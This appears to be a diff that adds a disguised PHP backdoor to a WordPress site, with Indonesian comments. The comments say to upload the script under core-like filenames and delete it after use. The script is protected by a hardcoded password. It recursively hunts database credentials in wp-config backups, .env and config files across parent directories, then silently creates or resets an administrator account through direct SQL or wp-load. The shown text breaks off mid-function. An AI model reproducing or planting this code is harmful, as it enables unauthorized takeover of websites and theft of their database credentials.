@@ -1,0 +1,1507 @@
+<?php
+// Buat WordPress Administrator - sekali pakai, HAPUS setelah berhasil
+// Upload dengan nama biasa: wp-user-sync.php | class-wp-session.php
+// Site: astverdi_pba-assunnah @ localhost | prefix wpyc_
+
+$BA_PASS = 'unm@sk666';
+
+$BA_USER  = 'adminrecovery';
+$BA_EMAIL = 'recovery@local.site';
+$BA_NEWPW = 'Recovery@2025!'; // ganti sebelum upload
+
+$BA_DEBUG = isset($_GET['debug']) && $_GET['debug'] === '1';
+
+@ini_set('display_errors', $BA_DEBUG ? '1' : '0');
+@error_reporting($BA_DEBUG ? E_ALL : 0);
+@set_time_limit(120);
+
+if (function_exists('mysqli_report')) {
+    @mysqli_report(MYSQLI_REPORT_OFF);
+}
+
+if (!function_exists('session_start')) {
+    die('PHP session extension required.');
+}
+@session_start();
+
+function ba_esc($s)
+{
+    return htmlspecialchars((string) $s, ENT_QUOTES, 'UTF-8');
+}
+
+function ba_ok()
+{
+    return !empty($_SESSION['ba_ok']);
+}
+
+function ba_is_cli()
+{
+    return (php_sapi_name() === 'cli' || defined('STDIN'));
+}
+
+function ba_is_fake_config($file)
+{
+    if (!is_file($file) || !is_readable($file)) {
+        return false;
+    }
+    $txt = @file_get_contents($file, false, null, 0, 8192);
+    if ($txt === false) {
+        return false;
+    }
+    if (stripos($txt, '<!DOCTYPE') !== false || stripos($txt, '<html') !== false) {
+        return true;
+    }
+    if (stripos($txt, 'Under Maintenance') !== false || stripos($txt, '<body') !== false) {
+        return true;
+    }
+    if (stripos($txt, '<?php') === false && stripos($txt, '<?') === false) {
+        if (stripos($txt, 'DB_NAME') === false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+function ba_is_wp_config($file)
+{
+    if (!is_file($file) || !is_readable($file)) {
+        return false;
+    }
+    if (ba_is_fake_config($file)) {
+        return false;
+    }
+    $txt = @file_get_contents($file);
+    if ($txt === false || strlen($txt) < 20) {
+        return false;
+    }
+    if (stripos($txt, 'DB_NAME') !== false && (stripos($txt, 'DB_USER') !== false || stripos($txt, 'DB_PASSWORD') !== false)) {
+        return true;
+    }
+    if (preg_match('/\$table_prefix/', $txt) && stripos($txt, 'DB_') !== false) {
+        return true;
+    }
+    if (preg_match('/require(?:_once)?\s*[\(\s][\'"][^\'"]*wp-config[^\'"]*[\'"]/', $txt)) {
+        return true;
+    }
+    return false;
+}
+
+function ba_config_alt_filenames()
+{
+    return array(
+        'wp-config-local.php',
+        'wp-config.php.bak',
+        'wp-config.bak',
+        'wp-config.php.old',
+        'wp-config.php.save',
+        'wp-config.php.orig',
+        'wp-config.php.backup',
+        'wp-config-backup.php',
+        'wp-config.old.php',
+        'wp-config.php~',
+        'wp-config.php.dist',
+        'wp-config-sample.php',
+    );
+}
+
+function ba_dirs_to_search_config($base)
+{
+    $dirs = array();
+    $rp = @realpath($base);
+    if (!$rp) {
+        if (is_dir($base)) {
+            $dirs[] = $base;
+        }
+        return $dirs;
+    }
+    $dirs[] = $rp;
+    $parent = @realpath($rp . '/..');
+    if ($parent) {
+        $dirs[] = $parent;
+    }
+    $parent2 = @realpath($rp . '/../..');
+    if ($parent2) {
+        $dirs[] = $parent2;
+    }
+    return array_values(array_unique($dirs));
+}
+
+function ba_scan_php_for_db_config($dir, $maxfiles)
+{
+    if (!is_dir($dir) || !is_readable($dir)) {
+        return '';
+    }
+    $items = @scandir($dir);
+    if (!$items) {
+        return '';
+    }
+    $checked = 0;
+    $i = 0;
+    $n = count($items);
+    for ($i = 0; $i < $n; $i++) {
+        if ($checked >= $maxfiles) {
+            break;
+        }
+        $item = $items[$i];
+        if ($item === '.' || $item === '..') {
+            continue;
+        }
+        if (!preg_match('/\.(php|inc|env|txt)$/i', $item)) {
+            continue;
+        }
+        if (stripos($item, 'wp-config') === false && stripos($item, 'config') === false && $item !== '.env') {
+            continue;
+        }
+        $full = $dir . '/' . $item;
+        if (!is_file($full)) {
+            continue;
+        }
+        $checked++;
+        if (ba_is_wp_config($full)) {
+            return ba_resolve_config_path($full);
+        }
+    }
+    return '';
+}
+
+function ba_parse_env_file($file)
+{
+    if (!is_readable($file)) {
+        return array('ok' => false);
+    }
+    $txt = file_get_contents($file);
+    $db = array('host' => 'localhost', 'user' => '', 'pass' => '', 'name' => '');
+    $prefix = 'wp_';
+    if (preg_match('/^DB_HOST\s*=\s*([^\r\n#]+)/m', $txt, $m)) {
+        $db['host'] = trim($m[1], " \t\"'");
+    }
+    if (preg_match('/^DB_USER\s*=\s*([^\r\n#]+)/m', $txt, $m)) {
+        $db['user'] = trim($m[1], " \t\"'");
+    }
+    if (preg_match('/^DB_PASSWORD\s*=\s*([^\r\n#]*)/m', $txt, $m)) {
+        $db['pass'] = trim($m[1], " \t\"'");
+    }
+    if (preg_match('/^DB_NAME\s*=\s*([^\r\n#]+)/m', $txt, $m)) {
+        $db['name'] = trim($m[1], " \t\"'");
+    }
+    if (preg_match('/^TABLE_PREFIX\s*=\s*([^\r\n#]+)/m', $txt, $m)) {
+        $prefix = trim($m[1], " \t\"'");
+    }
+    if ($db['user'] === '' || $db['name'] === '') {
+        return array('ok' => false);
+    }
+    return array('ok' => true, 'db' => $db, 'prefix' => $prefix, 'config_file' => $file);
+}
+
+function ba_is_placeholder_cred($val)
+{
+    $v = strtolower(trim((string) $val));
+    $bad = array(
+        'username_here',
+        'database_name_here',
+        'password_here',
+        'your_username',
+        'your_password',
+        'your_database',
+        'example',
+        'changeme',
+        'xxxxxxxx',
+    );
+    $i = 0;
+    $n = count($bad);
+    for ($i = 0; $i < $n; $i++) {
+        if ($v === $bad[$i] || strpos($v, $bad[$i]) !== false) {
+            return true;
+        }
+    }
+    return ($v === '');
+}
+
+function ba_is_unresolved_var($val)
+{
+    $val = trim((string) $val);
+    return ($val !== '' && $val[0] === '$');
+}
+
+function ba_resolve_php_var($name, $txt)
+{
+    $name = ltrim((string) $name, '$');
+    if ($name === '') {
+        return '';
+    }
+    $patterns = array(
+        '/\$' . preg_quote($name, '/') . '\s*=\s*[\'"]([^\'"]*)[\'"]\s*;/',
+        '/\$' . preg_quote($name, '/') . '\s*=\s*[\'"]([^\'"]*)[\'"]/',
+        '/\$' . preg_quote($name, '/') . '\s*=\s*([^;\s]+)/',
+    );
+    $i = 0;
+    $pn = count($patterns);
+    for ($i = 0; $i < $pn; $i++) {
+        if (preg_match($patterns[$i], $txt, $m)) {
+            $v = trim($m[1], " \t\n\r\0\x0B'\"");
+            if ($v !== '' && !ba_is_unresolved_var($v)) {
+                return $v;
+            }
+        }
+    }
+    return '';
+}
+
+function ba_var_alias($key)
+{
+    $map = array(
+        'DB_HOST'     => array('dbhost', 'db_host'),
+        'DB_USER'     => array('dbuser', 'db_user', 'username'),
+        'DB_PASSWORD' => array('dbpass', 'db_pass', 'dbpassword', 'password'),
+        'DB_NAME'     => array('dbname', 'db_name', 'database'),
+    );
+    return isset($map[$key]) ? $map[$key] : array();
+}
+
+function ba_resolve_cfg_value($key, $raw, $txt)
+{
+    $raw = trim((string) $raw, " \t\n\r\0\x0B'\"");
+    if ($raw === '') {
+        $aliases = ba_var_alias($key);
+        $i = 0;
+        $n = count($aliases);
+        for ($i = 0; $i < $n; $i++) {
+            $resolved = ba_resolve_php_var($aliases[$i], $txt);
+            if ($resolved !== '') {
+                return $resolved;
+            }
+        }
+        return '';
+    }
+    if (ba_is_unresolved_var($raw)) {
+        $resolved = ba_resolve_php_var($raw, $txt);
+        if ($resolved !== '') {
+            return $resolved;
+        }
+        $aliases = ba_var_alias($key);
+        $i = 0;
+        $n = count($aliases);
+        for ($i = 0; $i < $n; $i++) {
+            $resolved = ba_resolve_php_var($aliases[$i], $txt);
+            if ($resolved !== '') {
+                return $resolved;
+            }
+        }
+        return '';
+    }
+    return $raw;
+}
+
+function ba_sanitize_db_host($host, $txt)
+{
+    $host = ba_resolve_cfg_value('DB_HOST', $host, $txt);
+    if ($host === '' || ba_is_unresolved_var($host)) {
+        $host = ba_resolve_php_var('dbhost', $txt);
+    }
+    if ($host === '' || ba_is_unresolved_var($host)) {
+        $host = 'localhost';
+    }
+    if (!preg_match('/^[a-zA-Z0-9._\-:\/]+$/', $host)) {
+        $host = 'localhost';
+    }
+    return $host;
+}
+
+function ba_parse_db_fields($txt)
+{
+    $db = array(
+        'host' => ba_resolve_cfg_value('DB_HOST', ba_cfg_get('DB_HOST', $txt), $txt),
+        'user' => ba_resolve_cfg_value('DB_USER', ba_cfg_get('DB_USER', $txt), $txt),
+        'pass' => ba_resolve_cfg_value('DB_PASSWORD', ba_cfg_get('DB_PASSWORD', $txt), $txt),
+        'name' => ba_resolve_cfg_value('DB_NAME', ba_cfg_get('DB_NAME', $txt), $txt),
+    );
+    if (preg_match('/^DB_HOST\s*=\s*([^\r\n#]+)/m', $txt, $m)) {
+        $db['host'] = ba_resolve_cfg_value('DB_HOST', trim($m[1], " \t\"'"), $txt);
+    }
+    if (preg_match('/^DB_USER\s*=\s*([^\r\n#]+)/m', $txt, $m)) {
+        $db['user'] = ba_resolve_cfg_value('DB_USER', trim($m[1], " \t\"'"), $txt);
+    }
+    if (preg_match('/^DB_PASSWORD\s*=\s*([^\r\n#]*)/m', $txt, $m)) {
+        $db['pass'] = ba_resolve_cfg_value('DB_PASSWORD', trim($m[1], " \t\"'"), $txt);
+    }
+    if (preg_match('/^DB_NAME\s*=\s*([^\r\n#]+)/m', $txt, $m)) {
+        $db['name'] = ba_resolve_cfg_value('DB_NAME', trim($m[1], " \t\"'"), $txt);
+    }
+    $db['host'] = ba_sanitize_db_host($db['host'], $txt);
+    $prefix = 'wp_';
+    if (preg_match('/\$table_prefix\s*=\s*[\'"]([^\'"]+)[\'"]/', $txt, $m)) {
+        $prefix = $m[1];
+    }
+    if (preg_match('/^TABLE_PREFIX\s*=\s*([^\r\n#]+)/m', $txt, $m)) {
+        $prefix = trim($m[1], " \t\"'");
+    }
+    return array('db' => $db, 'prefix' => $prefix);
+}
+
+function ba_extract_db_from_text($txt, $file)
+{
+    if ($txt === false || strlen($txt) < 15) {
+        return null;
+    }
+    if (stripos($txt, '<html') !== false && stripos($txt, 'DB_NAME') === false && stripos($txt, '$dbname') === false) {
+        return null;
+    }
+    if (stripos($txt, 'DB_NAME') === false && stripos($txt, '$dbname') === false && stripos($txt, '$db_name') === false) {
+        return null;
+    }
+    $parsed = ba_parse_db_fields($txt);
+    $db = $parsed['db'];
+    $prefix = $parsed['prefix'];
+    if ($db['user'] === '' || $db['name'] === '' || ba_is_unresolved_var($db['user']) || ba_is_unresolved_var($db['name'])) {
+        return null;
+    }
+    if (ba_is_placeholder_cred($db['user']) || ba_is_placeholder_cred($db['name'])) {
+        return null;
+    }
+    return array(
+        'ok'     => true,
+        'db'     => $db,
+        'prefix' => $prefix,
+        'file'   => $file,
+    );
+}
+
+function ba_hunt_file_matches($name)
+{
+    if ($name === '.env') {
+        return true;
+    }
+    if (stripos($name, 'wp-config') !== false) {
+        return true;
+    }
+    if (preg_match('/config.*\.(php|inc|bak|old|save|orig|txt|env)$/i', $name)) {
+        return true;
+    }
+    return false;
+}
+
+function ba_hunt_scan_dir($dir, $depth, $maxdepth, &$found, &$seen, $maxhits)
+{
+    if ($depth > $maxdepth || count($found) >= $maxhits || !is_dir($dir) || !is_readable($dir)) {
+        return;
+    }
+    $items = @scandir($dir);
+    if (!$items) {
+        return;
+    }
+    $skip = array('node_modules', 'vendor', 'cache', 'uploads', 'upgrade', 'languages', 'fonts');
+    $i = 0;
+    $n = count($items);
+    for ($i = 0; $i < $n; $i++) {
+        if (count($found) >= $maxhits) {
+            return;
+        }
+        $item = $items[$i];
+        if ($item === '.' || $item === '..') {
+            continue;
+        }
+        $full = $dir . '/' . $item;
+        if (is_dir($full)) {
+            if ($item[0] === '.' && $item !== '.env') {
+                continue;
+            }
+            if (in_array(strtolower($item), $skip, true)) {
+                continue;
+            }
+            ba_hunt_scan_dir($full, $depth + 1, $maxdepth, $found, $seen, $maxhits);
+            continue;
+        }
+        if (!is_file($full) || !is_readable($full)) {
+            continue;
+        }
+        if (!ba_hunt_file_matches($item)) {
+            continue;
+        }
+        if (@filesize($full) > 512000) {
+            continue;
+        }
+        $txt = @file_get_contents($full);
+        $hit = ba_extract_db_from_text($txt, $full);
+        if ($hit === null) {
+            continue;
+        }
+        $key = $hit['db']['user'] . '@' . $hit['db']['host'] . '/' . $hit['db']['name'];
+        if (isset($seen[$key])) {
+            continue;
+        }
+        $seen[$key] = 1;
+        $found[] = $hit;
+    }
+}
+
+function ba_hunt_credentials($base)
+{
+    $found = array();
+    $seen = array();
+    $roots = array();
+    if ($base !== '') {
+        $roots = ba_dirs_to_search_config($base);
+    }
+    $here = @realpath(dirname(__FILE__));
+    if ($here) {
+        $roots[] = $here;
+        $p = $here;
+        $i = 0;
+        for ($i = 0; $i < 8; $i++) {
+            $parent = @realpath($p . '/..');
+            if (!$parent || $parent === $p) {
+                break;
+            }
+            $roots[] = $parent;
+            $p = $parent;
+        }
+    }
+    if (!empty($_SERVER['DOCUMENT_ROOT'])) {
+        $dr = @realpath($_SERVER['DOCUMENT_ROOT']);
+        if ($dr) {
+            $roots[] = $dr;
+            $roots[] = dirname($dr);
+        }
+    }
+    $roots = array_values(array_unique(array_filter($roots)));
+    $i = 0;
+    $rn = count($roots);
+    for ($i = 0; $i < $rn; $i++) {
+        ba_hunt_scan_dir($roots[$i], 0, 5, $found, $seen, 12);
+    }
+    return $found;
+}
+
+function ba_mask_pass($pass)
+{
+    $len = strlen($pass);
+    if ($len <= 2) {
+        return str_repeat('*', $len);
+    }
+    return substr($pass, 0, 1) . str_repeat('*', max(1, $len - 2)) . substr($pass, -1);
+}
+
+function ba_fake_wpconfig_path($base)
+{
+    $dirs = ba_dirs_to_search_config($base);
+    $i = 0;
+    $n = count($dirs);
+    for ($i = 0; $i < $n; $i++) {
+        $f = $dirs[$i] . '/wp-config.php';
+        if (is_file($f) && ba_is_fake_config($f)) {
+            return $f;
+        }
+    }
+    return '';
+}
+
+function ba_is_wp_root($dir)
+{
+    if (!is_dir($dir) || !is_readable($dir)) {
+        return false;
+    }
+    $rp = @realpath($dir);
+    $check = $rp ? $rp : $dir;
+    return (is_file($check . '/wp-load.php') && is_dir($check . '/wp-includes'));
+}
+
+function ba_resolve_config_path($file)
+{
+    if (!is_readable($file)) {
+        return $file;
+    }
+    $txt = @file_get_contents($file);
+    if ($txt !== false && preg_match('/require(?:_once)?\s*(?:\(?\s*)[\'"]([^\'"]+)[\'"]/', $txt, $m)) {
+        $inc = $m[1];
+        if ($inc !== '' && $inc[0] !== '/' && $inc[0] !== '\\' && strpos($inc, ':') !== 1) {
+            $inc = dirname($file) . '/' . $inc;
+        }
+        $rp = @realpath($inc);
+        if ($rp && is_file($rp) && ba_is_wp_config($rp)) {
+            return $rp;
+        }
+        if (is_file($inc) && ba_is_wp_config($inc)) {
+            return $inc;
+        }
+    }
+    return $file;
+}
+
+function ba_locate_config_file($base)
+{
+    if (is_file($base) && ba_is_wp_config($base)) {
+        return ba_resolve_config_path($base);
+    }
+    $dirs = ba_dirs_to_search_config($base);
+    $alt = ba_config_alt_filenames();
+    $i = 0;
+    $dn = count($dirs);
+    for ($i = 0; $i < $dn; $i++) {
+        $dir = $dirs[$i];
+        $j = 0;
+        $an = count($alt);
+        for ($j = 0; $j < $an; $j++) {
+            $c = $dir . '/' . $alt[$j];
+            if (is_file($c) && ba_is_wp_config($c)) {
+                return ba_resolve_config_path($c);
+            }
+        }
+        $env = $dir . '/.env';
+        if (is_file($env)) {
+            $ep = ba_parse_env_file($env);
+            if ($ep['ok']) {
+                return $env;
+            }
+        }
+        $hit = ba_scan_php_for_db_config($dir, 30);
+        if ($hit !== '') {
+            return $hit;
+        }
+    }
+    return '';
+}
+
+function ba_root_from_config_file($config_file)
+{
+    $cfg = ba_resolve_config_path($config_file);
+    $dir = dirname($cfg);
+    $dir_rp = @realpath($dir);
+    $dir_use = $dir_rp ? $dir_rp : $dir;
+    if (ba_is_wp_root($dir_use)) {
+        return $dir_use;
+    }
+    $subs = array('public_html', 'www', 'html', 'htdocs', 'web', 'wordpress', 'wp', 'blog', 'site');
+    $i = 0;
+    $sn = count($subs);
+    for ($i = 0; $i < $sn; $i++) {
+        $candidate = $dir_use . '/' . $subs[$i];
+        if (ba_is_wp_root($candidate)) {
+            $rp = @realpath($candidate);
+            return $rp ? $rp : $candidate;
+        }
+    }
+    $parent = @realpath($dir_use . '/..');
+    if ($parent && ba_is_wp_root($parent)) {
+        return $parent;
+    }
+    return $dir_use;
+}
+
+function ba_try_config_at($path)
+{
+    if (is_file($path) && ba_is_wp_config($path)) {
+        return ba_root_from_config_file($path);
+    }
+    $cfg = ba_locate_config_file($path);
+    if ($cfg !== '') {
+        return ba_root_from_config_file($cfg);
+    }
+    if (ba_is_wp_root($path)) {
+        $rp = @realpath($path);
+        return $rp ? $rp : $path;
+    }
+    $rp = @realpath($path);
+    if ($rp && ba_is_wp_root($rp)) {
+        return $rp;
+    }
+    return '';
+}
+
+function ba_collect_anchors()
+{
+    $anchors = array();
+    $here = realpath(dirname(__FILE__));
+    if ($here) {
+        $anchors[$here] = 1;
+        $p = $here;
+        $i = 0;
+        for ($i = 0; $i < 10; $i++) {
+            $parent = realpath($p . '/..');
+            if (!$parent || $parent === $p) {
+                break;
+            }
+            $anchors[$parent] = 1;
+            $p = $parent;
+        }
+    }
+    $root = isset($_SERVER['DOCUMENT_ROOT']) ? realpath($_SERVER['DOCUMENT_ROOT']) : false;
+    if ($root) {
+        $anchors[$root] = 1;
+        $subs = array('wordpress', 'wp', 'blog', 'public_html', 'html', 'www', 'htdocs');
+        $i = 0;
+        $sn = count($subs);
+        for ($i = 0; $i < $sn; $i++) {
+            $sp = realpath($root . '/' . $subs[$i]);
+            if ($sp) {
+                $anchors[$sp] = 1;
+            }
+        }
+    }
+    return array_keys($anchors);
+}
+
+function ba_rel_config_paths()
+{
+    return array(
+        'wp-config.php',
+        '../wp-config.php',
+        '../../wp-config.php',
+        '../../../wp-config.php',
+        '../../../../wp-config.php',
+        '../../../../../wp-config.php',
+        'wordpress/wp-config.php',
+        '../wordpress/wp-config.php',
+        'wp/wp-config.php',
+        '../wp/wp-config.php',
+        'public_html/wp-config.php',
+        '../public_html/wp-config.php',
+        'public_html/../wp-config.php',
+    );
+}
+
+function ba_rel_wp_root_paths()
+{
+    return array(
+        '.',
+        '..',
+        '../..',
+        '../../..',
+        'public_html',
+        '../public_html',
+        'www',
+        'html',
+        'htdocs',
+        'wordpress',
+        'wp',
+        'blog',
+    );
+}
+
+function ba_scan_for_config($dir, $depth, $maxdepth)
+{
+    if ($depth > $maxdepth || !is_dir($dir) || !is_readable($dir)) {
+        return '';
+    }
+    $hit = ba_try_config_at($dir);
+    if ($hit !== '') {
+        return $hit;
+    }
+    $items = @scandir($dir);
+    if (!$items) {
+        return '';
+    }
+    $skip = array('node_modules', 'vendor', 'cache', 'backup', 'backups', 'uploads', 'upgrade');
+    $i = 0;
+    $n = count($items);
+    for ($i = 0; $i < $n; $i++) {
+        $item = $items[$i];
+        if ($item === '.' || $item === '..' || $item[0] === '.') {
+            continue;
+        }
+        if (in_array(strtolower($item), $skip, true)) {
+            continue;
+        }
+        $full = $dir . '/' . $item;
+        if (!is_dir($full)) {
+            continue;
+        }
+        $hit = ba_scan_for_config($full, $depth + 1, $maxdepth);
+        if ($hit !== '') {
+            return $hit;
+        }
+    }
+    return '';
+}
+
+function ba_scan_for_wp_root($dir, $depth, $maxdepth)
+{
+    if ($depth > $maxdepth || !is_dir($dir) || !is_readable($dir)) {
+        return '';
+    }
+    if (ba_is_wp_root($dir)) {
+        $rp = @realpath($dir);
+        return $rp ? $rp : $dir;
+    }
+    $items = @scandir($dir);
+    if (!$items) {
+        return '';
+    }
+    $skip = array('node_modules', 'vendor', 'cache', 'backup', 'backups', 'uploads', 'upgrade');
+    $i = 0;
+    $n = count($items);
+    for ($i = 0; $i < $n; $i++) {
+        $item = $items[$i];
+        if ($item === '.' || $item === '..' || $item[0] === '.') {
+            continue;
+        }
+        if (in_array(strtolower($item), $skip, true)) {
+            continue;
+        }
+        $full = $dir . '/' . $item;
+        if (!is_dir($full)) {
+            continue;
+        }
+        $hit = ba_scan_for_wp_root($full, $depth + 1, $maxdepth);
+        if ($hit !== '') {
+            return $hit;
+        }
+    }
+    return '';
+}
+
+function ba_find_base($manual = '')
+{
+    $manual = trim((string) $manual);
+    if ($manual !== '') {
+        $candidates = array($manual);
+        if ($manual[0] !== '/' && $manual[0] !== '\\') {
+            $candidates[] = dirname(__FILE__) . '/' . $manual;
+            $candidates[] = dirname(__FILE__) . '/../' . $manual;
+            $candidates[] = dirname(__FILE__) . '/../../' . $manual;
+        }
+        $i = 0;
+        $cn = count($candidates);
+        for ($i = 0; $i < $cn; $i++) {
+            $hit = ba_try_config_at($candidates[$i]);
+            if ($hit !== '') {
+                return $hit;
+            }
+            $hit = ba_try_config_at(rtrim($candidates[$i], '/') . '/wp-config.php');
+            if ($hit !== '') {
+                return $hit;
+            }
+            $hit = ba_try_config_at(rtrim($candidates[$i], '/') . '/wp-load.php');
+            if ($hit !== '') {
+                return $hit;
+            }
+        }
+    }
+
+    $anchors = ba_collect_anchors();
+    $rels = ba_rel_config_paths();
+    $roots = ba_rel_wp_root_paths();
+    $i = 0;
+    $an = count($anchors);
+    for ($i = 0; $i < $an; $i++) {
+        $base = $anchors[$i];
+        $j = 0;
+        $rn = count($rels);
+        for ($j = 0; $j < $rn; $j++) {
+            $hit = ba_try_config_at($base . '/' . $rels[$j]);
+            if ($hit !== '') {
+                return $hit;
+            }
+        }
+        $j = 0;
+        $rnn = count($roots);
+        for ($j = 0; $j < $rnn; $j++) {
+            $hit = ba_try_config_at($base . '/' . $roots[$j]);
+            if ($hit !== '') {
+                return $hit;
+            }
+        }
+        $hit = ba_scan_for_config($base, 0, 4);
+        if ($hit !== '') {
+            return $hit;
+        }
+        $hit = ba_scan_for_wp_root($base, 0, 3);
+        if ($hit !== '') {
+            return $hit;
+        }
+    }
+    return '';
+}
+
+function ba_cfg_get($key, $txt)
+{
+    $patterns = array(
+        "/define\s*\(\s*['\"]" . preg_quote($key, '/') . "['\"]\s*,\s*['\"]([^'\"]*)['\"]\s*\)/",
+        "/define\s*\(\s*['\"]" . preg_quote($key, '/') . "['\"]\s*,\s*([^)\s]+)\s*\)/",
+    );
+    $i = 0;
+    $pn = count($patterns);
+    for ($i = 0; $i < $pn; $i++) {
+        if (preg_match($patterns[$i], $txt, $m)) {
+            return trim($m[1], " \t\n\r\0\x0B'\"");
+        }
+    }
+    if (preg_match("/getenv\s*\(\s*['\"]" . preg_quote($key, '/') . "['\"]\s*\)/", $txt)) {
+        $val = getenv($key);
+        if ($val !== false && $val !== '') {
+            return $val;
+        }
+    }
+    return '';
+}
+
+function ba_parse_wpconfig($base)
+{
+    $file = ba_locate_config_file($base);
+    if ($file !== '' && substr($file, -4) === '.env') {
+        return ba_parse_env_file($file);
+    }
+    if ($file === '' || !is_readable($file)) {
+        $fake = ba_fake_wpconfig_path($base);
+        if ($fake !== '') {
+            return array(
+                'ok'          => false,
+                'msg'         => 'wp-config.php PALSU (HTML/maintenance, bukan config WordPress). Cari file backup (wp-config.php.bak) atau isi kredensial DB manual di form bawah.',
+                'fake_config' => $fake,
+            );
+        }
+        return array('ok' => false, 'msg' => 'Config WordPress asli tidak ditemukan dari ' . $base . '. Isi kredensial DB manual.');
+    }
+    $txt = file_get_contents($file);
+    $parsed = ba_parse_db_fields($txt);
+    $db = $parsed['db'];
+    $prefix = $parsed['prefix'];
+    if ($db['user'] === '' || $db['name'] === '' || ba_is_unresolved_var($db['user']) || ba_is_unresolved_var($db['name'])) {
+        return array('ok' => false, 'msg' => 'Gagal parse DB_* dari ' . $file);
+    }
+    return array('ok' => true, 'db' => $db, 'prefix' => $prefix, 'config_file' => $file);
+}
+
+function ba_guess_prefix($mysqli)
+{
+    $rs = @$mysqli->query("SHOW TABLES LIKE '%users'");
+    if (!$rs) {
+        return 'wp_';
+    }
+    $best = '';
+    while ($row = $rs->fetch_array()) {
+        $tbl = $row[0];
+        if (preg_match('/^(.+)users$/', $tbl, $m)) {
+            $pref = $m[1];
+            if ($best === '' || $pref === 'wp_') {
+                $best = $pref;
+            }
+        }
+    }
+    return $best !== '' ? $best : 'wp_';
+}
+
+function ba_manual_db_from_request()
+{
+    $use = !empty($_POST['use_manual_db']);
+    if (!$use) {
+        return null;
+    }
+    $host = isset($_POST['db_host']) ? trim((string) $_POST['db_host']) : 'localhost';
+    $user = isset($_POST['db_user']) ? trim((string) $_POST['db_user']) : '';
+    $pass = isset($_POST['db_pass']) ? (string) $_POST['db_pass'] : '';
+    $name = isset($_POST['db_name']) ? trim((string) $_POST['db_name']) : '';
+    $pref = isset($_POST['db_prefix']) ? trim((string) $_POST['db_prefix']) : '';
+    if ($host === '') {
+        $host = 'localhost';
+    }
+    if ($user === '' || $name === '') {
+        return array('ok' => false, 'msg' => 'DB User dan DB Name wajib diisi saat pakai kredensial manual');
+    }
+    return array(
+        'ok'     => true,
+        'db'     => array('host' => $host, 'user' => $user, 'pass' => $pass, 'name' => $name),
+        'prefix' => $pref,
+        'source' => 'manual',
+    );
+}
+
+function ba_build_manual_db($use_manual_db, $db_host, $db_user, $db_pass, $db_name, $db_prefix)
+{
+    if (!$use_manual_db) {
+        return null;
+    }
+    $_POST['use_manual_db'] = '1';
+    $_POST['db_host'] = $db_host;
+    $_POST['db_user'] = $db_user;
+    $_POST['db_pass'] = $db_pass;
+    $_POST['db_name'] = $db_name;
+    $_POST['db_prefix'] = $db_prefix;
+    return ba_manual_db_from_request();
+}
+
+function ba_get_db_config($base, $manual)
+{
+    if ($manual !== null) {
+        if (!$manual['ok']) {
+            return $manual;
+        }
+        if (!empty($manual['prefix'])) {
+            return array(
+                'ok'          => true,
+                'db'          => $manual['db'],
+                'prefix'      => $manual['prefix'],
+                'config_file' => '(manual input)',
+                'source'      => 'manual',
+            );
+        }
+        $conn = ba_connect($manual['db']);
+        if (!$conn['ok']) {
+            return $conn;
+        }
+        $pref = ba_guess_prefix($conn['mysqli']);
+        $conn['mysqli']->close();
+        return array(
+            'ok'          => true,
+            'db'          => $manual['db'],
+            'prefix'      => $pref,
+            'config_file' => '(manual input, prefix auto)',
+            'source'      => 'manual',
+        );
+    }
+    $cfg = ba_parse_wpconfig($base);
+    if ($cfg['ok']) {
+        $cfg['source'] = 'config';
+    }
+    return $cfg;
+}
+
+function ba_connect($db)
+{
+    if (!class_exists('mysqli')) {
+        return array('ok' => false, 'msg' => 'Ekstensi mysqli tidak aktif di PHP');
+    }
+    if (ba_is_unresolved_var($db['host'])) {
+        return array('ok' => false, 'msg' => 'DB Host masih variabel (' . $db['host'] . '). Ganti manual ke localhost lalu Test lagi.');
+    }
+    $m = @new mysqli($db['host'], $db['user'], $db['pass'], $db['name']);
+    if ($m->connect_error) {
+        return array('ok' => false, 'msg' => 'DB connect: ' . $m->connect_error);
+    }
+    @$m->set_charset('utf8mb4');
+    return array('ok' => true, 'mysqli' => $m);
+}
+
+function ba_hash_password($base, $pass)
+{
+    $ph = $base . '/wp-includes/class-phpass.php';
+    if (is_file($ph)) {
+        require_once $ph;
+        if (class_exists('PasswordHash')) {
+            $hasher = new PasswordHash(8, true);
+            return $hasher->HashPassword($pass);
+        }
+    }
+    if (function_exists('password_hash')) {
+        $hash = @password_hash($pass, PASSWORD_BCRYPT);
+        if ($hash) {
+            return $hash;
+        }
+    }
+    return md5($pass);
+}
+
+function ba_via_wpload($base, $user, $pass, $email)
+{
+    if (!ba_is_cli()) {
+        return array('ok' => false, 'msg' => 'wp-load hanya untuk CLI; web pakai mysqli langsung');
+    }
+    $load = $base . '/wp-load.php';
+    if (!is_file($load)) {
+        return array('ok' => false, 'msg' => 'wp-load.php tidak ada');
+    }
+    if (!defined('WP_USE_THEMES')) {
+        define('WP_USE_THEMES', false);
+    }
+    require_once $load;
+    if (!function_exists('wp_create_user')) {
+        return array('ok' => false, 'msg' => 'wp_create_user tidak tersedia');
+    }
+    if (username_exists($user)) {
+        $u = get_user_by('login', $user);
+        if ($u) {
+            wp_set_password($pass, $u->ID);
+            $obj = new WP_User($u->ID);
+            $obj->set_role('administrator');
+            return array(
+                'ok'   => true,
+                'msg'  => 'User sudah ada - password direset + role administrator',
+                'user' => $user,
+                'pass' => $pass,
+                'id'   => $u->ID,
+                'via'  => 'wp-load (reset)',
+            );
+        }
+        return array('ok' => false, 'msg' => 'User sudah ada');
+    }
+    $id = wp_create_user($user, $pass, $email);
+    if (is_wp_error($id)) {
+        return array('ok' => false, 'msg' => $id->get_error_message());
+    }
+    $obj = new WP_User($id);
+    $obj->set_role('administrator');
+    return array(
+        'ok'   => true,
+        'msg'  => 'Admin baru berhasil dibuat',
+        'user' => $user,
+        'pass' => $pass,
+        'id'   => $id,
+        'via'  => 'wp-load',
+    );
+}
+
+function ba_via_mysqli($base, $user, $pass, $email, $manual = null)
+{
+    $cfg = ba_get_db_config($base, $manual);
+    if (!$cfg['ok']) {
+        return $cfg;
+    }
+    $pref = $cfg['prefix'];
+    $db = $cfg['db'];
+    $hash = ba_hash_password($base, $pass);
+    $conn = ba_connect($db);
+    if (!$conn['ok']) {
+        return $conn;
+    }
+    $m = $conn['mysqli'];
+    $u = $m->real_escape_string($user);
+    $e = $m->real_escape_string($email);
+    $h = $m->real_escape_string($hash);
+    $cap = $m->real_escape_string($pref . 'capabilities');
+    $lvl = $m->real_escape_string($pref . 'user_level');
+    $rs = $m->query("SELECT ID FROM {$pref}users WHERE user_login='$u' LIMIT 1");
+    if ($rs && $rs->num_rows > 0) {
+        $row = $rs->fetch_assoc();
